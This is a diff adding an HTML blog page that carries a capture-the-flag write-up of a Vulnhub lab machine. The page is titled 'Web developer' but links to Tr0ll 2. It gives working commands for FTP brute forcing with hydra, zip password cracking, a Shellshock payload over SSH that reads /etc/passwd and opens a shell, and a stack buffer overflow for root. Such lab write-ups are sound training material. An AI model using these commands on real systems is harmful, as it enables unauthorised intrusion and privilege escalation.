@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html >
+    
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="HandheldFriendly" content="true">
+<link rel="stylesheet" href="bootstrap.css">
+<style>
+
+body
+{
+margin:0%; padding:0%;
+background: url("background.png");
+}
+   
+.header
+{
+color: #6ed5a5;
+font-size: 30px;
+font-style:italic;
+font-weight: bold;
+text-align:center;
+display: block;
+margin-bottom:-23px;
+}     
+          
+.logo
+{
+width:100px;
+/*background: #E6E7E9; */    
+margin-top: 105px;
+border-radius:22px;
+position:absolute;
+margin-left: 46%;
+
+}
+@media only screen and (max-width: 600px) {
+  .logo {
+    margin-left:164px;
+  }
+}
+
+.header-background
+{
+  background: #000000;
+  display: block;
+  border-radius: 50px;
+  border:2px white;
+  border-style: solid;
+  margin-top: 10px;
+  height: 73px;
+}
+     
+
+
+
+.type_effect h1 {
+  overflow: hidden; /* Ensures the content is not revealed until the animation */
+  border-right: .15em solid orange; /* The typwriter cursor */
+  white-space: nowrap; /* Keeps the content on a single line */
+  margin: 0 auto; /* Gives that scrolling effect as the typing happens */
+  letter-spacing: .02em; /* Adjust as needed */
+  animation: typing 3.5s steps(40, end),
+    blink-caret .75s step-end infinite;
+}
+.slide_writing {
+  display: flex;
+  justify-content: center;
+  color: #6ed5a5;
+}
+.typewriter h1 {
+  overflow: hidden; /* Ensures the content is not revealed until the animation */
+  border-right: .30em solid orange; /* The typwriter cursor */
+  white-space: nowrap; /* Keeps the content on a single line */
+  font-size: 35px;
+  letter-spacing: .02em; /* Adjust as needed */
+  animation: 
+    typing 2.5s steps(40, end),
+    blink-caret .75s step-end infinite;
+}
+.article{
+  width: 90%;
+  height: 10%;
+  box-shadow: 1px 2px 7px 3px white;
+  margin-left: 5%;
+  margin-top: 110px;
+  border-radius: 22px;
+  background: #131310;
+}
+.article-heading{
+  font-family: "Times New Roman", Times, serif;
+  color: white;
+  margin-left: 10px;
+  font-size: 40px;
+}
+.article-content
+{
+  font-family:sohne, "Times New Roman", Times, serif;
+  color: white;
+  margin-left: 5px;
+  font-size: 28px;
+
+}
+.article-images{
+width:68%;
+margin:20px 0;
+border-radius:13px;
+vertical-align: middle;
+margin-left: 50px;
+}
+@media only screen and (max-width: 600px) {
+.article-images{
+width:76%;
+margin:20px 0;
+border-radius:13px;
+vertical-align: middle;
+margin-left: 50px;
+  }
+}
+/* The typing effect */
+@keyframes typing {
+  from { width: 0 }
+  to { width: 100% }
+}
+
+/* The typewriter cursor effect */
+@keyframes blink-caret {
+  from, to { border-color: transparent }
+  50% { border-color: #6ed5a5; }
+}
+@keyframes typing {
+  from { width: 0 }
+  to { width: 100% }
+}
+
+@keyframes blink-caret {
+  from, to { border-color: transparent }
+  50% { border-color: #6ed5a5; }
+}
+        </style>
+      
+      
+      
+    
+    
+    <body>
+          <script src="jquery-3.3.1.min.js"></script>    
+          <script src="bootstrap.min.js"></script>    
+
+      <title>Webdeveloper Write Up</title>
+
+    <a href= https://x-o-mar.github.io/ > <img src="tic tac toe.png" class="logo" >  </a>
+
+    <fieldset class="header-background">
+      <div class="header" >X-o-Mar BLOG  </div>
+     <div class=slide_writing>
+     <div class="typewriter"><h1>Web developer</h1></div>
+     </div>
+    </fieldset>
+    
+    
+<article class="article">
+  <h1 class="article-heading">Vulnhub Web developer</h1>
+  <p class="article-content">
+  	
+Difficulty: beginner to intermediate<br>
+<br>
+Link: https://www.vulnhub.com/entry/tr0ll-2,107/<br>
+<br>
+First thing first i wanted to figure out the machine ip so i used netdiscover<br>
+<br>
+=> netdiscover -r 192.168.1.1/24<br>
+<br>
+<img src="./pic/netdiscover.png" class="article-images"><br>
+
+Then i scanned the open ports using the nmap<br>
+<br>
+=> nmap -sC -sV 192.168.1.105 -oN nmap<br>
+
+<img src="./pic/nmap.png" class="article-images"><br>
+
+I started with the ftp port by trying ananoumus in username and password but it 
+didn't work <br>
+
+<img src="./pic/ftp-failed.png" class="article-images"><br>
+
+So i moved to the webpage<br>
+
+<img src="./pic/webpage.png" class="article-images"><br>
+
+I looked into the source code. There was only a comment with some names
+so took a note of them in a file and called it users.txt
+and used hydra to see if i can login to ftp using the names i got<br>	
+<br>
+=> hydra -L users.txt -P users.txt 192.168.1.105 ftp<br>
+<br>
+and i got a hit<br>
+
+<img src="./pic/hydra.png" class="article-images"><br>
+
+I loged in and found only .zip file
+
+<img src="./pic/inside-ftp.png" class="article-images"><br>
+
+So i downloaded it to my machine using the command <b>get</b> to see what is inside
+but it was protected with a password<br>
+<br>
+So i moved on started to fuzz the webpage using WFUZZ i got only robots.txt.<br>
+
+Inside robots.txt there was a list of directories i tried the first one and go a page
+but not with the secound one
+
+noted all of them in directories.txt and used it with wfuzz to figure out which one is working<br>
+<br>
+=> wfuzz -c -z file,./directories.txt --hc 404 http://192.168.1.105/FUZZ
+<br>
+<img src="./pic/wfuzz.png" class="article-images"><br>
+
+so now i have only 4 pages to check
+
+all of them had the same photo<br>
+
+<img src="./pic/cat_the_troll.jpg" class="article-images"><br>
+
+and a comment in the source code
+
+<img src="./pic/comment.png" class="article-images"><br>
+
+
+
+So i downloaded the 4 photos to see if there is any steganography in them.<br>
+<br>  
+First i used stegsolve but i didn't find any info in the photo itself<br>
+
+then i used strings and i got something from the one wich was in /dont_bother directory<br>
+
+<img src="./pic/your-self.png" class="article-images"><br>
+
+and when i checked the y0ur_self directory i found an file called answer
+
+<img src="./pic/answer.png" class="article-images"><br>
+
+inside it there was a base64 decoded list
+
+<img src="./pic/inside-answer.png" class="article-images"><br>
+
+i downloaded the file and decoded it<br>
+<br>
+=> wget http://192.168.1.105/y0ur_self/answer.txt
+<br>
+=> cat answer.txt |base64 -d > decoded-answer.txt<br>
+<br>
+So now i have a list of words so i went back to the protected .zip file<br>
+and used fcrackzip inorder to crack its password<br>
+<br>
+=> fcrackzip -u -D -p ./decoded-answer.txt  lmao.zip<br>
+<br>
+and i got a hit
+<br>
+<img src="./pic/fcrackzip.png" class="article-images"><br>
+
+Inside the zip file there was a ssh private kay file
+
+so i tried to login using the user noob<br>
+<br>
+=> ssh -i id_rsa -l noob 192.168.1.105<br>
+<br>
+but the machine wasn't that easy
+
+<img src="./pic/try-harder.png" class="article-images"><br>
+
+I ran the command again with verbose mode on so i found that running commands was
+set up for authorized keys for user noob. That's why the connection was closed immediately
+
+so i did some research and found that i can bypass this problem using
+
+<a href="https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=5ee60f4e-030f-4691-b5b4-dc3c9e3701d4&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments"  style="text-decoration: none;clear;float">shellshock</span></div> </a>
+
+so i tried to use it to read the /etc/passwd file<br>
+<br> 
+=> ssh -i noob -l noob 192.168.1.105 '() { :;}; cat /etc/passwd'
+<br>
+and it worked
+<br>
+
+<img src="./pic/etc.png" class="article-images"><br>
+
+<br>
+so i modified it to shell<br>
+
+=> ssh -i noob -l noob 192.168.1.105 '() { :;}; /bin/bash'<br>
+<br>
+then i upgraded it
+<br>
+=> python -c 'import pty; pty.spawn("/bin/bash")'<br>
+
+<img src="./pic/noob-shell.png" class="article-images"><br>
+
+and i am in!
+<br>
+first thing i enumerated the home direcroty but nothing was there<br>
+then i went to the / directory and a file called nothing_to_see_here
+got my attention
+
+<img src="./pic/nothing-here.png" class="article-images"><br>
+
+
+
+inside it there was another file called choose_wisely which included 3 doors
+two of them was designed to distract me and the 3rd one was a file with 
+buffer overflow vulnerability.
+
+<img src="./pic/doors.png" class="article-images"><br>
+
+
+And i found out that after specific amount of time the 3 doors were shuffled
+that's why i copied the vulnerabe one to /tmp and worked with it<br>
+<br>
+I wanted to know whether this linux system is 32-bit or 64-bit
+inorder to know which shell am i going to use. So i used uname command <br>
+<br>
+=> uname -m<br>
+
+<img src="./pic/uname.png" class="article-images"><br>
+
+It's 32 bit.<br>
+
+then i ran the file with gdb to test it<br>
+<br>
+=> gdb ./r00t<br>
+<br>
+
+<img src="./pic/gdb.png" class="article-images"><br>
+
+first i tried to input different amount of A to find out the sequance i need 
+
+i started with 200
+
+<img src="./pic/200.png" class="article-images"><br>
+
+it worked normally<br>
+<br>
+then i increased it to 300 .. it crashed<br>
+<br>
+now i need a unique pattern so i can i dentify the exact length which caused the crash
+so u used msf-pattern_create and specified it's length to 300<br> 
+<br>
+=> msf-pattern_create -l 300<br>
+<br>
+then i ran the pattern i got 
+<br>
+
+<img src="./pic/msf-pattern_creat.png" class="article-images"><br>
+
+
+then inorder to see the content of the register<br>
+<br>
+=> info reg<br>
+<br>
+<img src="./pic/eip.png" class="article-images"><br>
+
+now i used the eip value with msf-pattern_create to get the exact length<br>
+<br> 
+=> msf-pattern_offset -l 300 -q 0x6a413969
+
+<img src="./pic/exact-match.png" class="article-images"><br>
+
+to test the result i got i ran it combined with 4 B
+
+<img src="./pic/B*4.png" class="article-images"><br>
+
+it worked!
+
+now i need to get the return address which is the esp of the full shell<br>
+
+i used 24 bit shell from 
+
+<a href="http://shell-storm.org/shellcode/"  style="text-decoration: none;clear;float">here</span></div> </a>
+
+which is about 100 character. that's why i gave it only 20 of NOPS
+
+to give it space of decoiling<br>
+<br>
+=> run `python -c 'print "A" * 268 + "B" * 4 + "\x90" * 20 + "C" * 100 '`
+
+<img src="./pic/esp.png" class="article-images"><br>
+
+esp => 0xbffffb80<br>
+<br>
+i took it and combined it with the shell in form of little indian tested it file of /tmp directory<br>
+<br>
+<img src="./pic/tmp-done.png" class="article-images"><br>
+
+it worked!<br>
+<br>
+so i ran it in the original file
+<br>
+<img src="./pic/root.png" class="article-images"><br>
+and i got root :)
+
+
+
+</article>  
+    </body>
+
+
